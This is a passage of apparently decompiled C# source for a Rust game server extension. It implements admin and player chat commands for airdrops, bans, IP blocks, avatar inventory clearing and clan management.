namespace RustExtended
{
    using Facepunch;
    using Facepunch.Utility;
    using Magma;
    using RustProto;
    using RustProto.Helpers;
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.IO;
    using System.Linq;
    using System.Runtime.CompilerServices;
    using System.Security.Cryptography;
    using System.Text;
    using System.Text.RegularExpressions;
    using System.Timers;
    using uLink;
    using UnityEngine;

    public class Commands
    {
        private static Dictionary<NetUser, Inventory.Transfer[]> dictionary_0 = new Dictionary<NetUser, Inventory.Transfer[]>();
        [CompilerGenerated]
        private static ElapsedEventHandler elapsedEventHandler_0;
        [CompilerGenerated]
        private static ElapsedEventHandler elapsedEventHandler_1;
        private static float float_0 = 0f;
        private static float float_1 = 0f;
        [CompilerGenerated]
        private static Predicate<string> predicate_0;
        [CompilerGenerated]
        private static Predicate<string> predicate_1;
        [CompilerGenerated]
        private static Predicate<string> predicate_2;

        public static void About(NetUser Sender, string[] Args)
        {
            foreach (string str in Config.GetMessages("About.Message", Sender))
            {
                Broadcast.Message(Sender, str, null, 0f);
            }
            Broadcast.Message(Sender, "That RUST extension has been developed by Breaker.", null, 0f);
        }

        public static void Admin(NetUser Sender, UserData userData)
        {
            Sender.admin = !Sender.admin;
            Broadcast.Notice(Sender.networkPlayer, "✔", "You have " + (Sender.admin ? "enabled" : "disabled") + " administrator rights.", 5f);
        }

        public static void Airdrop(NetUser Sender, string Command, string[] Args)
        {
            if (Args.Length == 0)
            {
                SupplyDropZone.CallAirDrop();
            }
            else
            {
                Character character;
                PlayerClient playerClient = Helper.GetPlayerClient(Args[0]);
                if (playerClient == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                    return;
                }
                if (!Character.FindByUser(playerClient.userID, out character))
                {
                    return;
                }
                SupplyDropZone.CallAirDropAt(character.rigidbody.position);
            }
            if (Core.AirdropAnnounce)
            {
                Broadcast.MessageAll(Config.GetMessage("Airdrop.Incoming", Sender, null));
            }
        }

        public static void Announce(NetUser Sender, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                Broadcast.NoticeAll("☢", string.Join(" ", Args), null, 10f);
            }
        }

        public static void Avatars(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args == null) || (Args.Length == 0))
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
            }
            else
            {
                string[] directories = Directory.GetDirectories(server.datadir + "userdata/");
                RustProto.Avatar avatar = null;
                ulong result = 0L;
                int num2 = 0;
                switch (Args[0].ToLower())
                {
                    case "unused":
                        foreach (string str in directories)
                        {
                            if (ulong.TryParse(Path.GetFileName(str), out result) && (Users.GetBySteamID(result) == null))
                            {
                                Helper.Log("Unused avatar \"" + str + "\" has been removed.", false);
                                Directory.Delete(str, true);
                                num2++;
                            }
                        }
                        Broadcast.Notice(Sender, "✘", "Removed " + num2 + " unused avatar folder(s).", 5f);
                        return;

                    case "clear":
                        if (Args.Length < 2)
                        {
                            Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                            return;
                        }
                        switch (Args[1].ToLower())
                        {
                            case "all":
                            case "*":
                                foreach (string str2 in directories)
                                {
                                    if (ulong.TryParse(Path.GetFileName(str2), out result))
                                    {
                                        avatar = Users.Avatar.ContainsKey(result) ? Users.Avatar[result] : RustHook.ClusterServer_LoadAvatar(result);
                                        if (avatar != null)
                                        {
                                            using (Recycler<RustProto.Avatar, RustProto.Avatar.Builder> recycler = RustProto.Avatar.Recycler())
                                            {
                                                RustProto.Avatar.Builder builder = recycler.OpenBuilder();
                                                if (avatar.HasPos)
                                                {
                                                    builder.SetPos(avatar.Pos);
                                                }
                                                if (avatar.HasAng)
                                                {
                                                    builder.SetAng(avatar.Ang);
                                                }
                                                if (avatar.HasVitals)
                                                {
                                                    builder.SetVitals(avatar.Vitals.ToBuilder());
                                                }
                                                if (avatar.HasAwayEvent)
                                                {
                                                    builder.SetAwayEvent(avatar.AwayEvent);
                                                }
                                                builder.ClearBlueprints();
                                                builder.ClearInventory();
                                                builder.ClearWearable();
                                                builder.ClearBelt();
                                                avatar = builder.Build();
                                                RustHook.ClusterServer_SaveAvatar(result, ref avatar);
                                                if (Users.Avatar.ContainsKey(result))
                                                {
                                                    Users.Avatar[result] = avatar;
                                                }
                                                Helper.Log("Avatar \"" + str2 + "\" has been cleared.", true);
                                                num2++;
                                            }
                                        }
                                    }
                                }
                                Broadcast.Notice(Sender, "✘", "Cleared " + num2 + " avatar(s).", 5f);
                                return;

                            case "inventory":
                            case "inv":
                                foreach (string str3 in directories)
                                {
                                    if (ulong.TryParse(Path.GetFileName(str3), out result))
                                    {
                                        avatar = Users.Avatar.ContainsKey(result) ? Users.Avatar[result] : RustHook.ClusterServer_LoadAvatar(result);
                                        if (avatar != null)
                                        {
                                            using (Recycler<RustProto.Avatar, RustProto.Avatar.Builder> recycler2 = RustProto.Avatar.Recycler())
                                            {
                                                RustProto.Avatar.Builder builder2 = recycler2.OpenBuilder();
                                                if (avatar.HasPos)
                                                {
                                                    builder2.SetPos(avatar.Pos);
                                                }
                                                if (avatar.HasAng)
                                                {
                                                    builder2.SetAng(avatar.Ang);
                                                }
                                                if (avatar.HasVitals)
                                                {
                                                    builder2.SetVitals(avatar.Vitals.ToBuilder());
                                                }
                                                if (avatar.HasAwayEvent)
                                                {
                                                    builder2.SetAwayEvent(avatar.AwayEvent);
                                                }
                                                builder2.ClearBlueprints();
                                                builder2.ClearInventory();
                                                builder2.ClearWearable();
                                                builder2.ClearBelt();
                                                for (int i = 0; i < avatar.BlueprintsCount; i++)
                                                {
                                                    builder2.AddBlueprints(avatar.GetBlueprints(i));
                                                }
                                                avatar = builder2.Build();
                                                RustHook.ClusterServer_SaveAvatar(result, ref avatar);
                                                if (Users.Avatar.ContainsKey(result))
                                                {
                                                    Users.Avatar[result] = avatar;
                                                }
                                                Helper.Log("Inventory of avatar \"" + str3 + "\" has been cleared.", true);
                                                num2++;
                                            }
                                        }
                                    }
                                }
                                Broadcast.Notice(Sender, "✘", "Cleared inventory of " + num2 + " avatar(s).", 5f);
                                return;

                            case "wearable":
                            case "wear":
                                foreach (string str4 in directories)
                                {
                                    if (ulong.TryParse(Path.GetFileName(str4), out result))
                                    {
                                        avatar = Users.Avatar.ContainsKey(result) ? Users.Avatar[result] : RustHook.ClusterServer_LoadAvatar(result);
                                        if (avatar != null)
                                        {
                                            using (Recycler<RustProto.Avatar, RustProto.Avatar.Builder> recycler3 = RustProto.Avatar.Recycler())
                                            {
                                                RustProto.Avatar.Builder builder3 = recycler3.OpenBuilder();
                                                if (avatar.HasPos)
                                                {
                                                    builder3.SetPos(avatar.Pos);
                                                }
                                                if (avatar.HasAng)
                                                {
                                                    builder3.SetAng(avatar.Ang);
                                                }
                                                if (avatar.HasVitals)
                                                {
                                                    builder3.SetVitals(avatar.Vitals.ToBuilder());
                                                }
                                                if (avatar.HasAwayEvent)
                                                {
                                                    builder3.SetAwayEvent(avatar.AwayEvent);
                                                }
                                                builder3.ClearBlueprints();
                                                builder3.ClearInventory();
                                                builder3.ClearWearable();
                                                builder3.ClearBelt();
                                                for (int j = 0; j < avatar.BlueprintsCount; j++)
                                                {
                                                    builder3.AddBlueprints(avatar.GetBlueprints(j));
                                                }
                                                for (int k = 0; k < avatar.InventoryCount; k++)
                                                {
                                                    builder3.AddInventory(avatar.GetInventory(k));
                                                }
                                                for (int m = 0; m < avatar.BeltCount; m++)
                                                {
                                                    builder3.AddBelt(avatar.GetBelt(m));
                                                }
                                                avatar = builder3.Build();
                                                RustHook.ClusterServer_SaveAvatar(result, ref avatar);
                                                if (Users.Avatar.ContainsKey(result))
                                                {
                                                    Users.Avatar[result] = avatar;
                                                }
                                                Helper.Log("Wearable of avatar \"" + str4 + "\" has been cleared.", true);
                                                num2++;
                                            }
                                        }
                                    }
                                }
                                Broadcast.Notice(Sender, "✘", "Cleared wearable of " + num2 + " avatar(s).", 5f);
                                return;

                            case "belt":
                                foreach (string str5 in directories)
                                {
                                    if (ulong.TryParse(Path.GetFileName(str5), out result))
                                    {
                                        avatar = Users.Avatar.ContainsKey(result) ? Users.Avatar[result] : RustHook.ClusterServer_LoadAvatar(result);
                                        if (avatar != null)
                                        {
                                            using (Recycler<RustProto.Avatar, RustProto.Avatar.Builder> recycler4 = RustProto.Avatar.Recycler())
                                            {
                                                RustProto.Avatar.Builder builder4 = recycler4.OpenBuilder();
                                                if (avatar.HasPos)
                                                {
                                                    builder4.SetPos(avatar.Pos);
                                                }
                                                if (avatar.HasAng)
                                                {
                                                    builder4.SetAng(avatar.Ang);
                                                }
                                                if (avatar.HasVitals)
                                                {
                                                    builder4.SetVitals(avatar.Vitals.ToBuilder());
                                                }
                                                if (avatar.HasAwayEvent)
                                                {
                                                    builder4.SetAwayEvent(avatar.AwayEvent);
                                                }
                                                builder4.ClearBlueprints();
                                                builder4.ClearInventory();
                                                builder4.ClearWearable();
                                                builder4.ClearBelt();
                                                for (int n = 0; n < avatar.BlueprintsCount; n++)
                                                {
                                                    builder4.AddBlueprints(avatar.GetBlueprints(n));
                                                }
                                                for (int num8 = 0; num8 < avatar.InventoryCount; num8++)
                                                {
                                                    builder4.AddInventory(avatar.GetInventory(num8));
                                                }
                                                for (int num9 = 0; num9 < avatar.WearableCount; num9++)
                                                {
                                                    builder4.AddWearable(avatar.GetWearable(num9));
                                                }
                                                avatar = builder4.Build();
                                                RustHook.ClusterServer_SaveAvatar(result, ref avatar);
                                                if (Users.Avatar.ContainsKey(result))
                                                {
                                                    Users.Avatar[result] = avatar;
                                                }
                                                Helper.Log("Belt of avatar \"" + str5 + "\" has been cleared.", true);
                                                num2++;
                                            }
                                        }
                                    }
                                }
                                Broadcast.Notice(Sender, "✘", "Cleared belt of " + num2 + " avatar(s).", 5f);
                                return;

                            case "blueprint":
                            case "bp":
                                foreach (string str6 in directories)
                                {
                                    if (ulong.TryParse(Path.GetFileName(str6), out result))
                                    {
                                        avatar = Users.Avatar.ContainsKey(result) ? Users.Avatar[result] : RustHook.ClusterServer_LoadAvatar(result);
                                        if (avatar != null)
                                        {
                                            using (Recycler<RustProto.Avatar, RustProto.Avatar.Builder> recycler5 = RustProto.Avatar.Recycler())
                                            {
                                                RustProto.Avatar.Builder builder5 = recycler5.OpenBuilder();
                                                if (avatar.HasPos)
                                                {
                                                    builder5.SetPos(avatar.Pos);
                                                }
                                                if (avatar.HasAng)
                                                {
                                                    builder5.SetAng(avatar.Ang);
                                                }
                                                if (avatar.HasVitals)
                                                {
                                                    builder5.SetVitals(avatar.Vitals.ToBuilder());
                                                }
                                                if (avatar.HasAwayEvent)
                                                {
                                                    builder5.SetAwayEvent(avatar.AwayEvent);
                                                }
                                                builder5.ClearBlueprints();
                                                builder5.ClearInventory();
                                                builder5.ClearWearable();
                                                builder5.ClearBelt();
                                                for (int num10 = 0; num10 < avatar.InventoryCount; num10++)
                                                {
                                                    builder5.AddInventory(avatar.GetInventory(num10));
                                                }
                                                for (int num11 = 0; num11 < avatar.WearableCount; num11++)
                                                {
                                                    builder5.AddWearable(avatar.GetWearable(num11));
                                                }
                                                for (int num12 = 0; num12 < avatar.BeltCount; num12++)
                                                {
                                                    builder5.AddBelt(avatar.GetBelt(num12));
                                                }
                                                avatar = builder5.Build();
                                                RustHook.ClusterServer_SaveAvatar(result, ref avatar);
                                                if (Users.Avatar.ContainsKey(result))
                                                {
                                                    Users.Avatar[result] = avatar;
                                                }
                                                Helper.Log("Blueprints of avatar \"" + str6 + "\" has been cleared.", true);
                                                num2++;
                                            }
                                        }
                                    }
                                }
                                Broadcast.Notice(Sender, "✘", "Cleared blueprints of " + num2 + " avatar(s).", 5f);
                                return;

                            default:
                                return;
                        }
                        break;
                }
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
            }
        }

        public static void Ban(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                UserData data = Users.Find(Args[0]);
                if (data == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                }
                else if (Users.IsBanned(data.SteamID))
                {
                    Broadcast.Notice(Sender, "✘", "User " + data.Username + " already banned.", 5f);
                }
                else if ((Sender != null) && (userData.Rank <= data.Rank))
                {
                    Broadcast.Notice(Sender, "✘", "You are not allowed to ban a player of higher rank.", 5f);
                }
                else
                {
                    PlayerClient client;
                    if (PlayerClient.FindByUserID(data.SteamID, out client))
                    {
                        Broadcast.Notice(client.netPlayer, "☢", "You was a banned by " + ((Sender != null) ? Sender.displayName : "SERVER"), 5f);
                        client.netUser.Kick(NetError.NoError, true);
                    }
                    int result = 0;
                    DateTime period = new DateTime();
                    string reason = (Args.Length > 1) ? Args[1] : "No Reason.";
                    string details = (Args.Length > 3) ? Args[3] : ("Banned by \"" + ((Sender != null) ? Sender.displayName : "SERVER") + "\".");
                    if ((Args.Length > 2) && int.TryParse(Args[2], out result))
                    {
                        period = DateTime.Now.AddDays((double) result);
                    }
                    Users.Ban(data.SteamID, reason, period, details);
                    Broadcast.Notice(Sender, "✔", "User " + data.Username + " was banned" + ((result > 0) ? (" on " + result + " days.") : "."), 5f);
                    if (Sender != null)
                    {
                        Helper.Log("\"" + data.Username + "\" was a banned" + ((result > 0) ? (" on " + result + " days.") : "") + " by \"" + Sender.displayName + "\"", true);
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
        }

        public static void Block(NetUser Sender, string Command, string[] Args)
        {
            Class12 class2 = new Class12();
            if ((Args != null) && (Args.Length != 0))
            {
                if (Regex.IsMatch(Args[0], @"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"))
                {
                    class2.string_0 = Args[0];
                }
                else
                {
                    UserData data = Users.Find(Args[0]);
                    if (data == null)
                    {
                        Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                        return;
                    }
                    class2.string_0 = data.LastConnectIP;
                }
                if (Blocklist.Exists(class2.string_0))
                {
                    Broadcast.Notice(Sender, "✘", "IP address " + class2.string_0 + " already blocked.", 5f);
                }
                else
                {
                    Blocklist.Add(class2.string_0);
                    foreach (PlayerClient client in PlayerClient.All.FindAll(new Predicate<PlayerClient>(class2.method_0)))
                    {
                        Broadcast.Notice(client.netUser.networkPlayer, "✔", "You have been blocked by IP address.", 5f);
                        client.netUser.Kick(NetError.NoError, true);
                    }
                    Broadcast.Notice(Sender, "✔", "You block " + class2.string_0 + " IP address.", 5f);
                    if (Sender != null)
                    {
                        Helper.Log("\"IP address " + class2.string_0 + "\" was blocked by \"" + Sender.displayName + "\".", true);
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
        }

        public static void Clan(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            Predicate<Countdown> match = null;
            Predicate<EventTimer> predicate2 = null;
            Class7 class3 = new Class7 {
                netUser_0 = Sender,
                userData_0 = userData,
                string_0 = Command
            };
            if (!Clans.Enabled)
            {
                Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NotAvailable", null, class3.netUser_0, null), 5f);
            }
            else
            {
                UserData dataUser = null;
                UserData userdata = null;
                ClanData clan = null;
                ClanLevel level = (class3.userData_0.Clan != null) ? Clans.Levels.Find(new Predicate<ClanLevel>(class3.method_0)) : null;
                if ((Args == null) || (Args.Length == 0))
                {
                    if (class3.userData_0.Clan == null)
                    {
                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NotInClan", null, class3.netUser_0, null), 5f);
                    }
                    else
                    {
                        foreach (string str in Config.GetMessagesClan("Command.Clan.Info", class3.userData_0.Clan, class3.netUser_0, null))
                        {
                            if (!str.Contains("%CLAN."))
                            {
                                Broadcast.MessageClan(class3.netUser_0, str);
                            }
                        }
                    }
                }
                else
                {
                    string str2 = Args[0].ToUpper();
                    if ((class3.netUser_0 == null) || class3.netUser_0.admin)
                    {
                        if (str2.Equals("LIST"))
                        {
                            int num = 0;
                            Broadcast.Message(class3.netUser_0, "Total Clans: " + Clans.Count, null, 0f);
                            foreach (ClanData data4 in Clans.Database.Values)
                            {
                                Broadcast.Message(class3.netUser_0, string.Concat(new object[] { ++num, ". ", data4.ID.ToHEX(true), ": ", data4.Name, " <", data4.Abbr, "> - Lvl: ", data4.Level.Id }), null, 0f);
                            }
                            return;
                        }
                        if (str2.Equals("INFO"))
                        {
                            if (Args.Length < 2)
                            {
                                Broadcast.Notice(class3.netUser_0, "✘", "You must enter clan name for get information.", 5f);
                                return;
                            }
                            clan = Clans.Find(Args[1]);
                            if (clan == null)
                            {
                                Broadcast.Notice(class3.netUser_0, "✔", "Clan with name \"" + Args[1] + "\" not exists.", 5f);
                                return;
                            }
                            foreach (string str3 in Config.GetMessagesClan("Command.Clan.Info", clan, null, null))
                            {
                                if (!str3.Contains("%CLAN."))
                                {
                                    Broadcast.MessageClan(class3.netUser_0, str3);
                                }
                            }
                            foreach (string str4 in Config.GetMessagesClan("Command.Clan.InfoAdmin", clan, null, null))
                            {
                                if (str4.Contains("%CLAN.MEMBERS_LIST%"))
                                {
                                    string str5 = str4.Replace("%CLAN.MEMBERS_LIST%", "");
                                    foreach (UserData data5 in clan.Members.Keys)
                                    {
                                        str5 = str5 + data5.Username + ", ";
                                        if (str5.Length > 80)
                                        {
                                            Broadcast.MessageClan(class3.netUser_0, clan, str5.Substring(0, str5.Length - 2));
                                            str5 = "";
                                        }
                                    }
                                    if (str5.Length > 0)
                                    {
                                        Broadcast.MessageClan(class3.netUser_0, clan, str5.Substring(0, str5.Length - 2));
                                    }
                                }
                                else if (!str4.Contains("%CLAN."))
                                {
                                    Broadcast.MessageClan(class3.netUser_0, str4);
                                }
                            }
                            return;
                        }
                        if (str2.Equals("EDIT"))
                        {
                            if (Args.Length < 2)
                            {
                                Broadcast.Notice(class3.netUser_0, "✘", "You must enter clan name or abbr to edit properties.", 5f);
                                return;
                            }
                            clan = Clans.Find(Args[1]);
                            if (clan == null)
                            {
                                Broadcast.Notice(class3.netUser_0, "✔", "Clan with name \"" + Args[1] + "\" not exists.", 5f);
                                return;
                            }
                            if (Args.Length < 3)
                            {
                                Broadcast.Notice(class3.netUser_0, "✘", "What properties do you want edit for this clan?", 5f);
                                return;
                            }
                            if (Args.Length < 4)
                            {
                                Broadcast.Notice(class3.netUser_0, "✘", "You must enter NEW value for this properties", 5f);
                                return;
                            }
                            string str6 = Args[2].ToUpper();
                            if (str6.Equals("NAME"))
                            {
                                Broadcast.Notice(class3.netUser_0, "✔", "You change name for clan " + clan.Name, 5f);
                                clan.Name = Args[3];
                                return;
                            }
                            if (!str6.Equals("ABBR") && !str6.Equals("ABBREVIATION"))
                            {
                                if (!str6.Equals("MOTD") && !str6.Equals("MESSAGEOFTHEDAY"))
                                {
                                    if (!str6.Equals("BALANCE") && !str6.Equals("MONEY"))
                                    {
                                        if (!str6.Equals("EXP") && !str6.Equals("EXPERIENCE"))
                                        {
                                            if (str6.Equals("TAX"))
                                            {
                                                uint num4 = 0;
                                                if (!uint.TryParse(Args[3], out num4))
                                                {
                                                    Broadcast.Notice(class3.netUser_0, "✘", "WRONG: Requires only digits!", 5f);
                                                    return;
                                                }
                                                clan.Tax = num4;
                                                Broadcast.Notice(class3.netUser_0, "✔", string.Concat(new object[] { "You change tax to ", num4, "% for clan ", clan.Name }), 5f);
                                                return;
                                            }
                                            if (!str6.Equals("LVL") && !str6.Equals("LEVEL"))
                                            {
                                                if (str6.Equals("LEADER") || str6.Equals("CLANLEADER"))
                                                {
                                                    userdata = Users.Find(Args[3]);
                                                    if (userdata == null)
                                                    {
                                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[3]), 5f);
                                                        return;
                                                    }
                                                    clan.LeaderID = userdata.SteamID;
                                                    clan.Members[userdata] = ClanMemberFlags.management | ClanMemberFlags.dismiss | ClanMemberFlags.invite;
                                                    Broadcast.Notice(class3.netUser_0, "✔", "You change leader for clan " + clan.Name, 5f);
                                                }
                                                return;
                                            }
                                            Class8 class2 = new Class8 {
                                                class7_0 = class3,
                                                int_0 = 0
                                            };
                                            if (!int.TryParse(Args[3], out class2.int_0))
                                            {
                                                Broadcast.Notice(class3.netUser_0, "✘", "WRONG: Requires only digits!", 5f);
                                                return;
                                            }
                                            ClanLevel level2 = Clans.Levels.Find(new Predicate<ClanLevel>(class2.method_0));
                                            if (level2 != null)
                                            {
                                                clan.SetLevel(level2);
                                            }
                                            Broadcast.Notice(class3.netUser_0, "✔", string.Concat(new object[] { "You change level to ", level2.Id, " for clan ", clan.Name }), 5f);
                                            return;
                                        }
                                        ulong num3 = 0L;
                                        if (!ulong.TryParse(Args[3], out num3))
                                        {
                                            Broadcast.Notice(class3.netUser_0, "✘", "WRONG: Requires only digits!", 5f);
                                            return;
                                        }
                                        clan.Experience = num3;
                                        Broadcast.Notice(class3.netUser_0, "✔", "You change experience to " + num3.ToString("N0") + " for clan " + clan.Name, 5f);
                                        return;
                                    }
                                    ulong result = 0L;
                                    if (!ulong.TryParse(Args[3], out result))
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", "WRONG: Requires only digits!", 5f);
                                        return;
                                    }
                                    clan.Balance = result;
                                    Broadcast.Notice(class3.netUser_0, "✔", "You change balance to " + result.ToString("N0") + Economy.CurrencySign + " for clan " + clan.Name, 5f);
                                    return;
                                }
                                clan.MOTD = Args[3];
                                Broadcast.Notice(class3.netUser_0, "✔", "You change MOTD for clan " + clan.Name, 5f);
                                return;
                            }
                            clan.Abbr = Args[3];
                            Broadcast.Notice(class3.netUser_0, "✔", "You change abbreviation for clan " + clan.Name, 5f);
                            return;
                        }
                        if (str2.Equals("REMOVE") || str2.Equals("DELETE"))
                        {
                            if (Args.Length < 2)
                            {
                                Broadcast.Notice(class3.netUser_0, "✘", "You must enter clan name for remove.", 5f);
                                return;
                            }
                            clan = Clans.Find(Args[1]);
                            if (clan == null)
                            {
                                Broadcast.Notice(class3.netUser_0, "✔", "Clan with name \"" + Args[1] + "\" not exists.", 5f);
                                return;
                            }
                            foreach (UserData data6 in clan.Members.Keys)
                            {
                                data6.Clan = null;
                                NetUser player = NetUser.FindByUserID(data6.SteamID);
                                if (player != null)
                                {
                                    Broadcast.Notice(player, "☢", Config.GetMessageClan("Command.Clan.Disbanded", clan, class3.netUser_0, data6), 5f);
                                }
                            }
                            Broadcast.Notice(class3.netUser_0, "✘", "You remove \"" + clan.Name + "\" a clan", 5f);
                            Clans.Remove(clan);
                            return;
                        }
                    }
                    if (class3.netUser_0 == null)
                    {
                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageCommand("Command.InvalidSyntax", class3.string_0, class3.netUser_0), 5f);
                    }
                    else if (str2.Equals("CREATE") && (class3.userData_0.Clan != null))
                    {
                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.AlreadyInClan", null, class3.netUser_0, null), 5f);
                    }
                    else if (!str2.Equals("CREATE") && (class3.userData_0.Clan == null))
                    {
                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NotInClan", null, class3.netUser_0, null), 5f);
                    }
                    else
                    {
                        bool flag;
                        switch (str2)
                        {
                            case "CREATE":
                                if (Args.Length >= 2)
                                {
                                    if (!Regex.Match(Args[1], @"([^()<>{}\[\]]+)", RegexOptions.IgnoreCase).Success)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Create.ForbiddenSyntax", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (Args[1].Length < 3)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Create.TooShortLength", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (Args[1].Length > 0x20)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Create.TooLongLength", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (Clans.Find(Args[1]) != null)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Create.NameAlredyInUse", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (Economy.Enabled && (Clans.CreateCost > 0))
                                    {
                                        if (Clans.CreateCost > Economy.Get(class3.userData_0.SteamID).Balance)
                                        {
                                            Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Create.NotEnoughCurrency", null, class3.netUser_0, null), 5f);
                                            return;
                                        }
                                        UserEconomy economy1 = Economy.Get(class3.userData_0.SteamID);
                                        economy1.Balance -= Clans.CreateCost;
                                        Economy.Balance(class3.netUser_0, class3.userData_0, "balance", new string[0]);
                                    }
                                    class3.userData_0.Clan = Clans.Create(Args[1], class3.netUser_0.userID, DateTime.Now);
                                    Broadcast.Notice(class3.netUser_0, "✔", Config.GetMessageClan("Command.Clan.Create.Success", class3.userData_0.Clan, class3.netUser_0, class3.userData_0), 5f);
                                    class3.userData_0.Clan.Level = Clans.Levels[Clans.DefaultLevel];
                                    Clans.MemberJoin(class3.userData_0.Clan, class3.userData_0);
                                    return;
                                }
                                Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Create.ReqEnterName", null, class3.netUser_0, null), 5f);
                                return;

                            case "DISBAND":
                                if (class3.userData_0.Clan.LeaderID == class3.userData_0.SteamID)
                                {
                                    foreach (UserData data7 in class3.userData_0.Clan.Members.Keys)
                                    {
                                        if (class3.userData_0 != data7)
                                        {
                                            NetUser user2 = NetUser.FindByUserID(data7.SteamID);
                                            if (user2 != null)
                                            {
                                                Broadcast.Notice(user2, "☢", Config.GetMessageClan("Command.Clan.Disbanded", null, class3.netUser_0, null), 5f);
                                            }
                                            data7.Clan = null;
                                        }
                                    }
                                    Clans.Remove(class3.userData_0.Clan);
                                    class3.userData_0.Clan = null;
                                    Broadcast.Notice(class3.netUser_0, "☢", Config.GetMessageClan("Command.Clan.Disbanded", null, class3.netUser_0, null), 5f);
                                    return;
                                }
                                Broadcast.MessageClan(class3.netUser_0, Config.GetMessageClan("Command.Clan.NoPermissions", null, class3.netUser_0, null));
                                return;

                            case "UP":
                            case "RISE":
                            case "GROW":
                            case "LEVEL":
                                if (class3.userData_0.Clan.Members[class3.userData_0].Has<ClanMemberFlags>(ClanMemberFlags.management))
                                {
                                    if (level == null)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.LevelUp.ReachedMax", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (class3.userData_0.Clan.Balance < level.RequireCurrency)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.LevelUp.NotEnoughCurrency", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    if (class3.userData_0.Clan.Experience < level.RequireExperience)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.LevelUp.NotEnoughExperience", null, class3.netUser_0, null), 5f);
                                        return;
                                    }
                                    class3.userData_0.Clan.SetLevel(level);
                                    class3.userData_0.Clan.Balance -= level.RequireCurrency;
                                    class3.userData_0.Clan.Experience -= level.RequireExperience;
                                    foreach (string str7 in Config.GetMessagesClan("Command.Clan.LevelUp.Success", class3.userData_0.Clan, class3.netUser_0, null))
                                    {
                                        if (!str7.Contains("%CLAN."))
                                        {
                                            Broadcast.MessageClan(class3.userData_0.Clan, str7);
                                        }
                                    }
                                    return;
                                }
                                Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NoPermissions", null, class3.netUser_0, null), 5f);
                                return;

                            case "DEPOSIT":
                            {
                                ulong num5 = 0L;
                                UserEconomy economy = Economy.Get(class3.userData_0.SteamID);
                                if (!Economy.Enabled || (economy == null))
                                {
                                    Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessage("Economy.NotAvailable", class3.netUser_0, null), 5f);
                                    return;
                                }
                                if (((Args.Length >= 2) && ulong.TryParse(Args[1], out num5)) && (num5 != 0L))
                                {
                                    string newValue = num5.ToString("N0") + Economy.CurrencySign;
                                    if (economy.Balance < num5)
                                    {
                                        Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Deposit.NoEnoughAmount", class3.userData_0.Clan, class3.netUser_0, null).Replace("%DEPOSIT_AMOUNT%", newValue), 5f);
                                        return;
                                    }
                                    economy.Balance -= num5;
                                    class3.userData_0.Clan.Balance += num5;
                                    Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Deposit.Success", class3.userData_0.Clan, class3.netUser_0, null).Replace("%DEPOSIT_AMOUNT%", newValue), 5f);
                                    Economy.Balance(class3.netUser_0, class3.userData_0, "balance", new string[0]);
                                    return;
                                }
                                Broadcast.Notice(class3.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Deposit.NoAmount", null, class3.netUser_0, null), 5f);
                                return;
                            }
                            case "WITHDRAW":
                            {
                                ulong num6 = 0L;
                                UserEconomy economy2 = Economy.Get(class3.userData_0.SteamID);
                                if (class3.userData_0.Clan.Members[class3.userData_0].Has<ClanMemberFlags>(ClanMemberFlags.management))
                                {
                                    if (Economy.Enabled && (economy2 != null))
                                    {
                                        if (((Args.Length >= 2) && ulong.TryParse(Args[1], out num6)) && (num6 != 0L))
                                        {
